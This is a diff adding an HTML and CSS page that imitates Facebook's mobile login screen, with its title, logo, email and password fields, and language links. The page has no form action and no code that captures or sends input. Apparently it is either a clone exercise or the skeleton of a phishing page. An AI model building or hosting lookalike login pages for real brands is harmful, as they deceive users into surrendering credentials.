@@ -1,0 +1,183 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<title>Login | Facebook</title>
+	<link rel = "icon" href ="facebook.png" type = "image/x-icon"> 
+	<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" integrity="sha384-JcKb8q3iqJ61gNV9KGb8thSsNjpSL0n8PARn9HuZOnIxN0hoP+VmmDGMN5t9UJ0Z" crossorigin="anonymous">
+	<meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=1" />
+	<style>
+		img{
+			margin-top:0px;
+			border-top:0px;
+			display:block;
+            margin-left:auto;
+            margin-right:auto;
+            vertical-align: top;
+            width: 112px;
+		}
+		#input{
+			margin-top:3vh;
+		}
+		input{
+			display:block;
+			padding: 12px;
+			background-color: ;
+			line-height: 14px;
+			box-sizing: border-box;
+            width: 30%;
+            margin-left:auto;
+            margin-right:auto;
+            margin-bottom:1vh;
+            font-size: 14px;
+            font-family: Helvetica, Arial, sans-serif;
+            background: #f5f6f7;
+            border:0px;
+            border-radius:3px;
+            outline: none;
+            border-bottom:1px solid rgba(195, 195, 195,0.4);
+		}
+		input:focus {
+  border: 2px solid rgb(255, 194, 102);
+}
+@media screen and (max-width: 480px) {
+	input{
+	        width: 90%;
+            margin-left:auto;
+            margin-right:auto;
+	}
+}
+.btnfamily{
+	margin-top:2vh;
+	display:block;
+      width: 30%;
+      margin-left:auto;
+      margin-right:auto;
+      font-size: 17px;
+      height: 40px;
+      font-weight: bold;
+      font-family: sans-serif;
+	}
+	@media screen and (max-width: 480px) {
+		.btnfamily{
+			 width: 90%;
+		}
+	}
+	h6 {
+   width: 30%; 
+   text-align: center; 
+   border-bottom: 2px solid rgba(204, 208, 213,0.4);
+   line-height: 0.1em;
+   margin-left:auto;
+   margin-right:auto;
+   margin-top:5vh;
+   color:black;
+} 
+@media screen and (max-width: 480px) {
+	h6{width: 90%; }
+}
+h6 span { 
+    background:#fff; 
+    padding:0 10px; 
+}
+#btn2{
+	width:15%;
+	 margin-left:auto;
+   margin-right:auto;
+   font-size: 13px;
+   margin-top:5vh;
+}
+@media screen and (max-width: 480px) {
+	#btn2{
+	width:50%;
+	font-size:14px;
+}
+}
+a{
+	display:block;
+	width:10%;
+	 margin-left:auto;
+   margin-right:auto;
+   font-size: 14px;
+   color:#7596c8;
+   font-family: 'Roboto-Regular', 'Helvetica', 'sans-serif';
+   margin-top:1vh;
+}
+@media screen and (max-width: 480px) {
+	a{
+width:38%;	}
+}
+#lang{
+     display:block;
+     width:60%;
+     margin-left:auto;
+     margin-right:auto;
+     height:12vh;
+     margin-top:5vh;
+ }
+ #lang1{
+     display:inline-block;
+    height:30vh;
+      width:20%;
+      float:left;
+
+ }
+  #lang2{
+display:inline-block;
+     height:30vh;
+      width:20%;
+      float:right;
+ }
+ @media screen and (max-width: 480px) {
+ 	#lang{
+ 	 width:70%;}
+ 	 #lang1,#lang2{
+ 	 	width:30%;
+ 	 }
+}
+ p{
+ 	text-align:center;
+ 	font-weight: bold;
+ 	    font-size: 12px;
+ 	   color:  #576b95;
+ 	   margin:0px;
+ 	   padding:0px;
+ 	       cursor: pointer;
+ }
+ #inc{
+ 	text-align:center;
+ 	color:gray;
+ }
+	</style>
+
+</head>
+<body>
+	<div>
+		<a href="https://mobile.facebook.com/login.php">
+			<img src="facebooklogo.svg" width="112" alt="facebook">
+		</a>
+		</div>
+		<div id="input">
+		<input  autocomplete="on" name="email" placeholder="Mobile number or email address" type="text">
+		<input  autocomplete="on"  name="pass" placeholder="Password" type="password">
+	    </div>
+	    <button   type="submit" onClick=""; class="btn btn-primary btnfamily" >Log In</button>
+	    <h6><span>or</span></h6>
+	     <button  id="btn2" onClick="window.location='#"; class="btn btn-success btnfamily" >Create New Account</button>
+	     <a href="#">Forgotten password?</a>
+	     <div id="lang">
+	     	<div id="lang1">
+	     		<p style="color:#90949c;">English (UK)</p>
+	     		<p>मराठी</p>
+	     		<p>ಕನ್ನಡ</p>
+	     		<p>తెలుగు</p>
+	     	</div>
+	     	<div id="lang2">
+	     		<p>हिन्दी</p>
+	     		<p>اردو</p>
+	     		<p>മലയാളം</p>
+	     		<p>+</p>
+	     	</div>
+	     </div>
+	     <p id="inc">Facebook Inc.</p>
+</body>
+</html>
